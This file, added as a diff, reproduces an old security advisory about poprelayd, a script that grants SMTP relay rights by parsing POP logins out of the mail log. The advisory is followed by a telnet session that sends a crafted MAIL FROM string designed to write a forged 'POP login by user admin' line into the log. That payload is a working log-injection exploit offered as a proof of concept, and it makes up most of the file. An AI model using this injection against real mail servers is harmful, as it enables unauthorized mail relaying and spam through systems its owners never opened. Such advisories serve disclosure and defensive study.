@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/2986/info
+
+poprelayd is a script that parses /var/log/maillog for valid pop logins, and based upon the login of a client, allows the person logged into the pop3 service to also send email from the ip address they're accessing the system with.
+
+poprelayd doesn't authenticate output to the /var/log/maillog file. This makes it possible for a user to create an arbitrary string via sendmail that will be logged to the file, thus allowing a remote user to relay mail through the SMTP server. 
+
+telnet dumbcobalt 25
+Trying 123.123.123.123...
+Connected to dumbcobalt
+...
+ehlo dumbcobalt
+...
+mail from:"POP login by user "admin" at (66.66.66.66) 66.66.66.66
+@linux.org"
+553 "POP login by user "admin" at (66.66.66.66) 66.66.66.66
+@linux.org"...Domain name required 
